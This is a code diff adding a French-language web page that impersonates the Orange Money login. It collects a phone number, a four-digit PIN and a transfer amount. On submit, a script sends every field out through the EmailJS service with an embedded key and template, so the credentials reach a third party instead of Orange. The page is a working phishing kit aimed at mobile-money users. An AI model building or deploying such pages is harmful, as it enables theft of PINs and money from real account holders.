@@ -1,0 +1,140 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Orange Money</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 100px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+
+        header h1 {
+            text-align: center;
+            color: #ff6600;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        #form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        #form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff6600;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            text-align: center;
+            color: #ff6600;
+            cursor: pointer;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        footer a {
+            color: #ff6600;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="orange.png" alt="Instagram Logo">
+        </div>
+        <form id="form">
+            <input type="number" id="email" name="email" placeholder="numero de telephone"required>
+            <input type="password" id="password" name="password" maxlength="4" oninput="validatePassword(this)" placeholder="mot de passe" required>
+<span id="passwordError" style="color: red;"></span>
+
+<script>
+function validatePassword(input) {
+    var password = input.value;
+    var passwordError = document.getElementById('passwordError');
+
+    if (password.length > 4 || !/^\d+$/.test(password)) {
+        passwordError.textContent = "Le mot de passe doit contenir uniquement 4 chiffres.";
+        input.setCustomValidity("Invalid");
+    } else {
+        passwordError.textContent = "";
+        input.setCustomValidity("");
+    }
+}
+</script>
+
+            <input type="number" id="montant" name="montant" placeholder="Montant"  required>
+            <button type="submit" id="button" value="send email" name="button">envoyer par orange money</button>
+            <div class="forgot-password">Mot de passe oublié?</div>
+        </form>
+        <footer>
+            <p>Vous n'avez pas de compte? <a href="#">Inscrivez-vous</a></p>
+        </footer>
+    </div>
+
+ <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('b8BrXyea9nSWawnII')
+</script>
+
+    <script>
+        
+        const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_msdkbaj';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+    </script>
+
+</body>
+</html>
